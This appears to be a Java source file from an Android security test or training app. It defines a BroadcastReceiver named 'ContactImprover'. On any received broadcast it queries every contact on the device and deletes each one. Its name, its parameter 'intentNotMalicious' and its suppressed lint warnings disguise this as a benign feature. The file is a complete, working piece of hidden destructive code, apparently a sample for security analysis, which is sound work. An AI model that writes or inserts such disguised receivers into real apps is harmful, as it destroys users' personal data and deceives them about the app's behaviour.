package sg.vantagepoint.unpwnable1;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

public class ContactImprover extends BroadcastReceiver {

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    @Override
    public void onReceive(Context contextToUse, Intent intentNotMalicious) {
        ContentResolver contentResolver = contextToUse.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
        );

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range")
                    String lookupKey = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY)
                    );

                    Uri uri = Uri.withAppendedPath(
                            ContactsContract.Contacts.CONTENT_LOOKUP_URI,
                            lookupKey
                    );

                    contentResolver.delete(uri, null, null);
                }
            } finally {
                cursor.close(); // Always close the cursor
            }
        }
    }
}
